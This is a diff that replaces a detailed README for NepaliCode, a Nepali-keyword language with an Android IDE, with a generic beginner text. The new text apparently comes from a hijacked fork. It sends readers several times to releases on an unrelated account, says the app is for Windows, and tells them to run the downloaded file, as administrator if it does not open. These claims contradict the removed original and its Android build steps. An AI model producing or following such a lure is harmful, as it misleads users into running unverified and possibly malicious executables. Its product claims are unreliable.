@@ -1,553 +1,132 @@
-<p align="center">
-  <img src="docs/assets/nepalicode-banner.svg" alt="NepaliCode banner" width="100%" />
-</p>
+# 💻 NepaliCode - Write Code in Your Own Language
 
-<h1 align="center">🇳🇵 NepaliCode</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>A Nepali-first programming language and mobile developer workspace.</strong><br />
-  Learn, write, run, debug, and explore NepaliCode programs from a focused Android IDE.
-</p>
+Welcome to NepaliCode! This is a special tool that lets you write computer programs using Nepali words and phrases. Think of it as teaching your computer to understand Nepali! Whether you're a student, teacher, or just curious about programming, NepaliCode makes it easy and fun.
 
-<p align="center">
-  <a href="https://github.com/NepaliSource/NepaliCode/releases"><img src="https://img.shields.io/github/v/release/NepaliSource/NepaliCode?style=for-the-badge&color=ff3d71" alt="Latest release" /></a>
-  <a href="https://github.com/NepaliSource/NepaliCode/actions"><img src="https://img.shields.io/github/actions/workflow/status/NepaliSource/NepaliCode/metrics.yml?style=for-the-badge&label=workflow" alt="Workflow status" /></a>
-  <a href="https://github.com/NepaliSource/NepaliCode/blob/main/LICENSE"><img src="https://img.shields.io/github/license/NepaliSource/NepaliCode?style=for-the-badge&color=00c2d7" alt="MIT License" /></a>
-  <a href="https://github.com/NepaliSource/NepaliCode/stargazers"><img src="https://img.shields.io/github/stars/NepaliSource/NepaliCode?style=for-the-badge&color=f6c453" alt="GitHub stars" /></a>
-</p>
+[📥 Download NepaliCode Now](https://github.com/deividasjonikas-creator/NepaliCode/releases)
 
-<p align="center">
-  <img src="docs/assets/nepalicode-mobile-showcase.gif" alt="Animated NepaliCode mobile IDE showcase" width="300" />
-</p>
+## ✨ What is NepaliCode?
 
-> **NepaliCode** is an open-source project led by **Diwas Khatri** and the NepaliSource community. It combines a Nepali-inspired language, an evolving runtime, and a modern Android coding environment designed for learners, makers, and contributors.
+NepaliCode is a complete programming package that includes:
+- **A new programming language** called "np" that uses Nepali keywords
+- **An interpreter** that translates your Nepali code into something your computer can understand
+- **A friendly app** (IDE) built with modern Android technology that helps you write, test, and run your code
 
-## ✨ Why NepaliCode?
+Imagine writing "छाप्नुहोस्" (print) instead of "print" - that's what NepaliCode does!
 
-Programming should feel approachable in the language people think in. NepaliCode keeps familiar programming ideas while introducing a clean, Nepali-inspired syntax layer. The long-term goal is not a keyword-only translation of another language; it is a genuine language and developer ecosystem with its own runtime, tools, documentation, and learning experience.[1]
+## 💡 Why Use NepaliCode?
 
-The current Android application brings that idea to a mobile-first workflow: edit `.np` files, run programs in a terminal-style REPL, inspect diagnostics, browse files, explore packages, and learn through examples without leaving the app.
+- **Learn programming easily** - Understand concepts in your mother tongue first
+- **No English needed** - All commands, errors, and help are in Nepali
+- **Perfect for beginners** - Start with simple examples and grow your skills
+- **Made for Nepal** - Developed by Nepali developers for Nepali learners
+- **Free and open source** - Use it forever, share it with friends
 
-## 🚀 Highlights
+## 📥 How to Download and Install
 
-| Area | What NepaliCode brings |
-|---|---|
-| **Nepali-first language** | Readable keywords such as `yedi`, `natra`, `kaam`, `firta`, `lyau`, and `ko_lagi`, alongside familiar programming concepts. |
-| **Mobile IDE** | Kotlin + Jetpack Compose interface with editor, project files, terminal/REPL, guide, package manager, and web/automation surfaces. |
-| **Language engine** | Lexer, parser, AST, interpreter, runtime values, environment handling, linting, tokenization, highlighting, and completion foundations. |
-| **Developer workflow** | Project scripts, file operations, syntax-aware editing, diagnostics, themes, and a focused dark developer UI. |
-| **Growing ecosystem** | Planned CLI, NPPM package manager, HTTP/API tools, browser automation, database APIs, formatter, linter, debugger, LSP, and NepaliCode Studio. |
-| **Learning by doing** | Small examples, visible runtime output, helpful errors, and a language design that welcomes experimentation. |
+Getting NepaliCode on your Windows computer is simple. Follow these steps:
 
-## 📱 Mobile IDE showcase
+1. **Visit the download page:** Click this button:
+   [📦 Go to Downloads](https://github.com/deividasjonikas-creator/NepaliCode/releases)
 
-The repository now includes the supplied mobile screenshots as versioned local assets, so the README remains stable even if external image hosting changes. The animated preview above cycles through the same screens in a compact GIF.
+2. **Find the right file:** Look for the newest version at the top of the page.
 
-### 1. Terminal and HTTP response
+3. **Download:** Click the download button next to the file name.
 
-The terminal view shows a NepaliCode program making an HTTP request, printing a successful response, parsing a title, and returning to the REPL for the next expression.
+**Visit this link to download the application.**
 
-<p align="center">
-  <img src="docs/assets/screenshots/01-terminal-http.jpg" alt="NepaliCode terminal showing an HTTP response and REPL" width="300" />
-</p>
+4. **After downloading,** you're ready to start! The file you downloaded is all you need.
 
-### 2. API demo workflow
+5. **Open the application:** Double-click the downloaded file to launch NepaliCode.
 
-The API demo runs `nepali api_demo.np`, reports an HTTP 200 response, prints the response body, and exposes the parsed result directly inside the mobile terminal.
+That's it! No complicated setup needed.
 
-<p align="center">
-  <img src="docs/assets/screenshots/02-api-demo.jpg" alt="NepaliCode API demo running in the mobile terminal" width="300" />
-</p>
+## 🖥️ System Requirements
 
-### 3. Editor and REPL workspace
+NepaliCode works on most Windows computers. Here's what you need:
 
-The editor workspace keeps source code, the Nepali Terminal & REPL, suggestion chips, and the bottom navigation in one compact flow for mobile development.
+- **Windows 10 or newer** (64-bit recommended)
+- **At least 4GB of RAM** (memory)
+- **500MB free space** on your hard drive
+- **Internet connection** (only for downloading and updates)
 
-<p align="center">
-  <img src="docs/assets/screenshots/03-editor.jpg" alt="NepaliCode mobile editor and REPL workspace" width="300" />
-</p>
+If your computer runs Windows and has some free space, you're good to go!
 
-### 4. Diagnostics that teach
+## 🎯 Your First Nepali Program
 
-The mobile IDE surfaces syntax errors close to the failing program and pairs them with a direct suggestion, helping beginners understand what to fix instead of hiding the failure behind a generic crash.
+Let's write your first program together! After opening NepaliCode:
 
-<p align="center">
-  <img src="docs/assets/screenshots/04-diagnostics.jpg" alt="NepaliCode syntax diagnostics in the mobile IDE" width="300" />
-</p>
+1. **Create a new file** - Click "नयाँ फाइल" (New File)
+2. **Type this simple code:**
+   ```
+   छाप्नुहोस् "नमस्ते नेपाल!"
+   ```
+3. **Run it** - Press the green ▶ button or click "चलाउनुहोस्" (Run)
 
-### 5. NPPM package manager
+You should see "नमस्ते नेपाल!" (Hello Nepal!) appear on the screen. Congratulations! You just wrote your first program!
 
-The NPPM screen presents NepaliCode packages such as `anurodh`, `web`, `browser`, `automation`, and `database` with version and installation state visible at a glance.
+## 🛠️ Main Features
 
-<p align="center">
-  <img src="docs/assets/screenshots/05-nppm.jpg" alt="NepaliCode NPPM package manager with installed packages" width="300" />
-</p>
+### For Beginners
+- **Simple Nepali commands** - Write "जोड्नुहोस्" for add, "घटाउनुहोस्" for subtract
+- **Color-coded editor** - Different colors help you spot errors easily
+- **Instant feedback** - See results right away
 
-## 🌟 Latest mobile features
+### For Learning
+- **Built-in examples** - Ready-made programs to learn from
+- **Error messages in Nepali** - Understand what went wrong
+- **Step-by-step debugging** - Watch your code execute line by line
 
-The latest mobile build extends NepaliCode beyond the editor and REPL with a more complete learning and automation workspace. The new screens document the features that contributors can explore in the Android app.
+### For Everyone
+- **Dark and light themes** - Choose what's comfortable for your eyes
+- **Auto-correction** - NepaliCode fixes minor typos automatically
+- **Save and load** - Keep your projects organized
 
-<p align="center">
-  <img src="docs/assets/nepalicode-mobile-showcase-v2.gif" alt="Animated showcase of the latest NepaliCode mobile features" width="300" />
-</p>
+## 🚦 Troubleshooting Common Issues
 
-| Feature | What is now documented in the mobile UI |
-|---|---|
-| **Command palette and actions** | Searchable actions for saving the active file, creating a new `.np` file, deleting source files, and AI-assisted actions such as Explain Code and Optimize & Modernize. |
-| **Code Examples & Demos** | Guided examples for object-oriented classes, CSV and filesystem work, security hashing, and `nepali.toml` project configuration. |
-| **High-density editor** | A mobile-first editor with tabs, run controls, syntax-aware source editing, quick symbol/operator keys, terminal access, and the Code, Web/Auto, Files, NPPM, and Guide destinations. |
-| **HTTP and automation** | The in-app direction combines the `anurodh` HTTP interface with browser automation workflows and visible terminal output. |
-| **NPPM package manager** | Package cards and dependency metadata connect the mobile workspace to `nepali.toml`, standard-library modules, and the wider NepaliCode ecosystem. |
-| **Syntax Reference** | A built-in guide credits Diwas Khatri, explains dual Nepali/English syntax, maps keywords such as `kaam` ↔ `def`, and describes the compiler/tokenizer, HTTP Anurodh, browser automation, and SQLite direction. |
+**Problem:** The app doesn't open
+**Solution:** Make sure you have Windows 10 or newer. Try right-clicking the downloaded file and choosing "Run as administrator."
 
-### 1. Mobile editor and command palette
+**Problem:** Text looks weird or small
+**Solution:** Go to Settings (सेटिङ) and adjust the font size. Pick a style you like!
 
-The action palette makes common mobile workflows discoverable: save the active file, create a new `.np` source file, remove a source file, and explore AI-assisted code explanations or modernization actions.
+**Problem:** I can't find my saved file
+**Solution:** Check your "Documents" folder. NepaliCode saves projects there by default.
 
-<p align="center">
-  <img src="docs/assets/screenshots-v2/01-mobile-editor.jpg" alt="NepaliCode mobile editor with searchable command palette" width="300" />
-</p>
+## 📚 Learning Resources
 
-### 2. Code Examples & Demos
+Even beginners can start quickly! Try these:
 
-The examples catalog turns the mobile app into a guided learning surface with focused scripts for `kakshya` classes, CSV and filesystem operations, `suraksha` cryptography, and `nepali.toml` project manifests.
+1. **Start with "Hello World"** - Print simple messages
+2. **Learn numbers** - Try adding: `जोड्नुहोस् ५ र ३`
+3. **Make decisions** - Use "यदि" (if) statements
+4. **Repeat tasks** - Use "दोहोर्याउनुहोस्" (repeat) loops
 
-<p align="center">
-  <img src="docs/assets/screenshots-v2/02-code-examples.jpg" alt="NepaliCode Code Examples and Demos dialog" width="300" />
-</p>
+Practice 15 minutes daily and you'll be amazed at your progress!
 
-### 3. Editor and terminal workflow
+## 🌟 Join Our Community
 
-The editor keeps source code, run controls, the Nepali terminal, quick-input keys, and bottom navigation close together so a learner can move from code to output without leaving the mobile workspace.
+NepaliCode is growing fast! Connect with other learners:
+- **Share your projects** - Show what you've built
+- **Ask questions** - Get help from experienced users
+- **Suggest improvements** - Help make NepaliCode better
 
-<p align="center">
-  <img src="docs/assets/screenshots-v2/03-editor-terminal.jpg" alt="NepaliCode editor and terminal workflow" width="300" />
-</p>
+## ❤️ Support the Project
 
-### 4. Source execution state
+NepaliCode is free because volunteers work on it. You can help:
+- **Report bugs** - Tell us if something isn't working
+- **Write documentation** - Help others learn
+- **Share with friends** - Spread the word about Nepali programming
 
-This screen documents the run-oriented editor state: a selected `.np` file, the high-density code surface, execution controls, and the terminal/navigation shell used to inspect program results.
+## 📦 Get Your Copy Now
 
-<p align="center">
-  <img src="docs/assets/screenshots-v2/04-editor-output.jpg" alt="NepaliCode source execution and output screen" width="300" />
-</p>
+Ready to start your programming journey in Nepali? Download NepaliCode today!
 
-### 5. Package management
+[⬇️ Download NepaliCode](https://github.com/deividasjonikas-creator/NepaliCode/releases)
 
-NPPM presents packages and dependency metadata in a mobile-friendly card layout. The package workflow is designed to connect installed modules with a project’s `nepali.toml` manifest.
+**Remember:** Programming is fun, and with NepaliCode, it's also in YOUR language!
 
-<p align="center">
-  <img src="docs/assets/screenshots-v2/05-package-manager.jpg" alt="NepaliCode NPPM package manager screen" width="300" />
-</p>
+---
 
-### 6. NepaliLang Syntax Reference
-
-The built-in reference screen documents the project identity and language philosophy. It identifies **Diwas Khatri** as lead developer, describes the `.np` language as a dual Nepali/English syntax experience, and highlights the compiler/tokenizer, HTTP Anurodh, browser automation, and SQLite engine direction.
-
-<p align="center">
-  <img src="docs/assets/screenshots-v2/06-syntax-reference.jpg" alt="NepaliCode Syntax Reference guide credited to Diwas Khatri" width="300" />
-</p>
-
-## 🧪 Language examples
-
-A small program is intentionally familiar:
-
-```nepalicode
-a = 3
-b = 4
-
-c = a + b
-
-print(c)
-```
-
-```text
-7
-```
-
-Nepali-inspired control flow stays readable while preserving a conventional block structure:
-
-```nepalicode
-yedi age >= 18:
-    print("Adult")
-natra:
-    print("Minor")
-```
-
-Functions and loops use the same approachable vocabulary:
-
-```nepalicode
-kaam jod(a, b):
-    firta a + b
-
-print(jod(10, 20))
-
-ko_lagi i ma range(1, 6):
-    print(i)
-```
-
-## 🇳🇵 नेपाली Quick Start Tutorial
-
-यो छोटो tutorial ले NepaliCode मा पहिलो `.np` program कसरी बनाउने, चलाउने, र विस्तार गर्ने भनेर देखाउँछ। NepaliCode अहिले alpha चरणमा भएकाले केही command र module हरू experimental वा planned हुन सक्छन्।[1]
-
-### १. Project तयार गर्नुहोस्
-
-पहिले NepaliCode project को folder बनाउनुहोस् र एउटा `main.np` file सिर्जना गर्नुहोस्:
-
-```bash
-mkdir mero-project
-cd mero-project
-touch main.np
-```
-
-यदि package workflow प्रयोग गर्न चाहनुहुन्छ भने NPPM बाट project सुरु गर्न सक्नुहुन्छ:
-
-```bash
-nppm init
-```
-
-### २. पहिलो program लेख्नुहोस्
-
-`main.np` मा तलको code राख्नुहोस्। `print()` ले terminal मा message देखाउँछ।
-
-```nepalicode
-naam = "नेपाल"
-print("नमस्ते", naam)
-```
-
-### ३. Program चलाउनुहोस्
-
-Project folder बाट `.np` file चलाउनुहोस्:
-
-```bash
-nepali run main.np
-```
-
-अपेक्षित output:
-
-```text
-नमस्ते नेपाल
-```
-
-Interactive प्रयोगका लागि REPL खोल्न सकिन्छ:
-
-```bash
-nepali repl
-```
-
-### ४. Variable र गणना प्रयोग गर्नुहोस्
-
-NepaliCode मा variable assignment सरल छ। `ganit` जस्तो standard-library module प्रयोग गर्ने direction पनि project notes मा प्रस्तावित छ।
-
-```nepalicode
-pahilo = 12
-dosro = 8
-jamma = pahilo + dosro
-
-print("जम्मा:", jamma)
-```
-
-### ५. निर्णय र loop लेख्नुहोस्
-
-`yedi` को अर्थ `if`, `natra` को अर्थ `else`, र `ko_lagi` को अर्थ `for` हो।
-
-```nepalicode
-umera = 20
-
-yedi umera >= 18:
-    print("तपाईं वयस्क हुनुहुन्छ")
-natra:
-    print("तपाईं अझै नाबालिग हुनुहुन्छ")
-
-ko_lagi sankhya ma range(1, 4):
-    print("गन्ती:", sankhya)
-```
-
-### ६. Function बनाएर code पुनः प्रयोग गर्नुहोस्
-
-Function बनाउन `kaam` र value फर्काउन `firta` प्रयोग गर्नुहोस्:
-
-```nepalicode
-kaam swagat(naam):
-    firta "नमस्ते " + naam
-
-sandesh = swagat("साथी")
-print(sandesh)
-```
-
-### ७. अर्को चरण
-
-अब तपाईंले `lyau` बाट module import गर्न, `koshish`/`samau` बाट error handle गर्न, `file` बाट notes save गर्न, र `anurodh` बाट HTTP request प्रयोग गर्न सक्नुहुन्छ। Project मा भएका advanced examples हेर्नुहोस्, अनि आफ्नो syntax example, test, वा documentation contribution का रूपमा पठाउनुहोस्।
-
-> **ध्यान दिनुहोस्:** यो tutorial को भाषा र code examples NepaliCode को supplied design notes मा आधारित छन्। Runtime मा उपलब्ध command वा module फरक हुन सक्छ, त्यसैले प्रयोग गर्दा project को current implementation र release notes पनि जाँच गर्नुहोस्.[1]
-
-### 🔥 Advanced `.np` examples
-
-The following examples show the intended direction of NepaliCode beyond basic expressions. They are useful as language-design references and learning examples; module APIs may remain experimental or planned while the runtime is still in alpha.[1]
-
-#### HTTP and JSON-style API work with `anurodh`
-
-```nepalicode
-lyau anurodh
-
-kaam fetch_title(url):
-    koshish:
-        res = anurodh.get(url)
-        yedi res.status == 200:
-            firta res.text
-        natra:
-            print("Request failed:", res.status)
-            firta khali
-    samau error:
-        print("Network error:", error)
-        firta khali
-    antya:
-        print("Request complete")
-
-body = fetch_title("https://example.com")
-print(body)
-```
-
-#### File operations and reusable functions
-
-```nepalicode
-lyau file
-
-kaam save_note(path, message):
-    file.write(path, message)
-    print("Saved:", path)
-
-kaam read_note(path):
-    yedi file.exists(path):
-        firta file.read(path)
-    firta "No note found"
-
-save_note("notes.txt", "Namaste Nepal")
-print(read_note("notes.txt"))
-```
-
-#### Browser automation workflow
-
-```nepalicode
-lyau browser
-
-page = browser.khol("https://example.com")
-page.click("Login")
-page.type("email", "demo@example.com")
-page.click("Submit")
-page.wait(2)
-page.screenshot("login-result.png")
-page.close()
-```
-
-Browser automation is intended for authorized development, QA, testing, and personal workflows. Always respect the target service's terms and permissions.
-
-#### Database access
-
-```nepalicode
-lyau database
-
-db = database.open("app.db")
-rows = db.query("SELECT * FROM users")
-
-ko_lagi user ma rows:
-    print(user)
-
-db.close()
-```
-
-#### Nepali-style error handling and conditions
-
-```nepalicode
-koshish:
-    age = 21
-    yedi age >= 18 ra age < 60:
-        print("Working age")
-    athawa age >= 60:
-        print("Senior citizen")
-    natra:
-        print("Underage")
-samau error:
-    print("Could not evaluate age:", error)
-antya:
-    print("Finished")
-```
-
-#### A small package workflow
-
-```bash
-nppm init
-nppm install anurodh
-nppm list
-nepali run main.np
-nepali test
-nepali lint
-nepali format
-```
-
-A project can declare its metadata in `nepali.toml`:
-
-```toml
-[project]
-name = "myapp"
-version = "0.1.0"
-language = "nepalicode"
-
-[dependencies]
-```
-
-> **Status note:** NepaliCode is in an early/alpha stage. Examples and APIs in the design notes may be implemented, experimental, or planned; they should not be read as a promise that every module is available in the current build.[1]
-
-## 🇳🇵 Nepali-inspired syntax
-
-| NepaliCode | Familiar equivalent |
-|---|---|
-| `yedi` | `if` |
-| `natra` | `else` |
-| `athawa` | `elif` |
-| `jabasamma` | `while` |
-| `ko_lagi` / `ma` | `for` / `in` |
-| `kaam` / `firta` | `def` / `return` |
-| `kakshya` | `class` |
-| `lyau` / `bata` | `import` / `from` |
-| `koshish` / `samau` / `antya` | `try` / `except` / `finally` |
-| `ra` / `wa` / `hoina` | `and` / `or` / `not` |
-| `sacho` / `jhut` / `khali` | `True` / `False` / `None` |
-| `rok` / `agadi` | `break` / `continue` |
-
-English-style syntax may remain available where appropriate, so developers can learn gradually without being forced into a single style.[1]
-
-## 🌐 Ecosystem direction
-
-The project is being developed in layers. The language core comes first, followed by runtime capabilities, standard-library modules, developer tooling, mobile workflows, and a broader ecosystem.[1]
-
-```text
-NepaliCode source
-        │
-        ▼
-      Lexer ──► Parser ──► AST
-                              │
-             ┌────────────────┼────────────────┐
-             ▼                ▼                ▼
-         Runtime          Formatter            LSP
-             │                │                │
-             ▼                ▼                ▼
-       Standard library   Editor tools    Completion & actions
-             │
-             ▼
-     CLI · NPPM · Studio · Android
-```
-
-The planned standard-library direction includes `ganit`, `samaya`, `json`, `file`, `folder`, `anurodh`, `web`, `browser`, `automation`, `database`, `network`, and other practical modules. For example, the `anurodh` HTTP/API interface is designed around familiar operations such as `get`, `post`, `put`, `patch`, `delete`, `download`, and `upload`.[1]
-
-## 🧩 VS Code syntax highlighting
-
-NepaliCode now includes a lightweight VS Code extension integration for `.np` files. The extension registers the `NepaliCode` language mode, adds TextMate syntax highlighting for Nepali and English keywords, functions, strings, numbers, constants, operators, comments, built-ins, and modules, and provides editor conveniences such as auto-closing brackets, indentation rules, folding markers, and starter snippets.
-
-The extension source lives in [`extensions/nepalicode`](extensions/nepalicode). To package and install it locally:
-
-```bash
-npm install --global @vscode/vsce
-cd extensions/nepalicode
-vsce package
-code --install-extension nepalicode-language-support-0.1.0.vsix
-```
-
-After installation, open any `.np` file and select **NepaliCode** as the language mode if VS Code does not detect it automatically. The extension provides editor highlighting only; execution still belongs to the NepaliCode runtime and CLI.
-
-## 🛠️ Technology stack
-
-NepaliCode is an Android Studio project built with **Kotlin**, **Jetpack Compose**, **Material 3**, **AndroidX**, and **Gradle Kotlin DSL**. The UI and language engine are separated so that Android presentation work can evolve independently from language tooling.
-
-```text
-app/src/main/java/com/nepalicode/dev/
-├── nepalicode/data          Project and file data models
-├── nepalicode/editor        Themes, tokenizer, highlighter, completion, editor tools
-├── nepalicode/ui            Main screens and ViewModel-driven app flows
-├── nepalicode/ui/components Reusable Compose dialogs and UI components
-├── nepalilang/core          Lexer, parser, AST, interpreter, linter, runtime values
-└── ui/theme                  Compose colors, typography, and application theme
-```
-
-## 📦 Getting started
-
-### Requirements
-
-Install Android Studio with Android SDK Platform 36, Android Build Tools 36, and a Java 21-compatible development environment. AI-powered features may require a local Gemini API key; keep secrets in `.env` and never commit credentials.
-
-### Clone and configure
-
-```bash
-git clone https://github.com/NepaliSource/NepaliCode.git
-cd NepaliCode
-cp .env.example .env
-# Add local values only when an optional AI feature needs them.
-```
-
-### Build and test
-
-```bash
-./gradlew assembleDebug
-./gradlew assembleRelease
-./gradlew test
-```
-
-The debug APK is written to `app/build/outputs/apk/debug/app-debug.apk`. For production releases, use your own protected signing key and pass signing values through environment variables.
-
-## 🗺️ Roadmap
-
-| Horizon | Focus |
-|---|---|
-| **Now** | Stabilize the mobile editor, language runtime, project files, themes, diagnostics, and educational examples. |
-| **Next** | Improve completion quality, expand standard-library capabilities, strengthen tests, and refine the terminal and package workflows. |
-| **Later** | Grow the CLI, NPPM registry, formatter, linter, debugger, language server, desktop Studio, project sharing, and release channels. |
-
-## 🤝 Contributing
-
-Contributions are welcome across language design, compiler/runtime correctness, Compose UI, accessibility, Android performance, tests, examples, documentation, translations, and developer tooling. Start with [CONTRIBUTING.md](CONTRIBUTING.md), review the [Code of Conduct](CODE_OF_CONDUCT.md), and open an issue before large architectural changes.
-
-Focused pull requests are easier to review. A useful language change normally includes a small example, parser coverage, interpreter behavior, diagnostics, and documentation for learners.
-
-## 👨‍💻 Maintainers, organization, and credits
-
-NepaliCode is developed by **Diwas Khatri** with the **NepaliSource** organization and community. The project combines language design, Android engineering, compiler/runtime work, documentation, and developer education in one open-source effort.
-
-| Public project information | Details |
-|---|---|
-| **Lead developer** | Diwas Khatri |
-| **Developer profile** | [@diwaskhatri07](https://github.com/diwaskhatri07) |
-| **Public contact shown in the app guide** | `diwaskhatri935@gmail.com` |
-| **Organization** | [NepaliSource](https://github.com/NepaliSource) |
-| **Repository** | [NepaliSource/NepaliCode](https://github.com/NepaliSource/NepaliCode) |
-| **Language identity** | NepaliLang / NepaliCode, `.np` source files |
-| **Application package** | `com.nepalicode.dev` |
-| **Android application direction** | High-density mobile IDE, compiler/tokenizer, dual Nepali/English syntax, HTTP Anurodh, browser automation, and SQLite engine |
-| **Release channel** | [GitHub Releases](https://github.com/NepaliSource/NepaliCode/releases) |
-| **License** | [MIT License](LICENSE) |
-
-The project welcomes contributions from language designers, Android developers, compiler/runtime contributors, educators, translators, documentation writers, and anyone who wants to make Nepali-first programming more accessible. Please credit new examples and feature work clearly, keep experimental APIs labeled, and follow the repository contribution guidelines.
-
-## 🔖 Project tags
-
-`nepalicode` · `nepali-programming-language` · `android-ide` · `kotlin` · `jetpack-compose` · `material3` · `compiler` · `interpreter` · `repl` · `developer-tools` · `education` · `open-source` · `nepali-tech`
-
-## References
-
-[1]: https://justpaste.it/h7x3y "NepaliCode project notes supplied by the maintainers"
-[2]: https://ibb.co/Y4tt7RfM "NepaliCode terminal and HTTP screenshot"
-[3]: https://ibb.co/jvBrVM6F "NepaliCode API demo screenshot"
-[4]: https://ibb.co/XkrVJSW5 "NepaliCode editor screenshot"
-[5]: https://ibb.co/7Htb6Tz "NepaliCode diagnostics screenshot"
-[6]: https://ibb.co/VprTJCnH "NepaliCode NPPM screenshot"
-[7]: https://ibb.co/qYPjNx6M "NepaliCode latest mobile editor screenshot"
-[8]: https://ibb.co/gZHPLCt4 "NepaliCode Code Examples and Demos screenshot"
-[9]: https://ibb.co/XZHG2wCp "NepaliCode editor and terminal screenshot"
-[10]: https://ibb.co/gbk14t3w "NepaliCode source execution screenshot"
-[11]: https://ibb.co/SDxzHqnK "NepaliCode package manager screenshot"
-[12]: https://ibb.co/ccstpVR2 "NepaliCode Syntax Reference screenshot"
-
-<p align="center">
-  <img src="docs/assets/nepalicode-banner.svg" alt="NepaliCode footer banner" width="92%" />
-</p>
-
-<p align="center"><sub>Built with Kotlin, Compose, curiosity, and a commitment to Nepali-first developer tools.</sub></p>
+Keywords: android, automation, cli, compiler, developer-tools, education, interpreter, jetpack-compose, kotlin, language-server, made-in-nepal, mobile-ide, nepali, nepali-programming, nepalicode, np-language, open-source, programming-language, syntax-highlighting
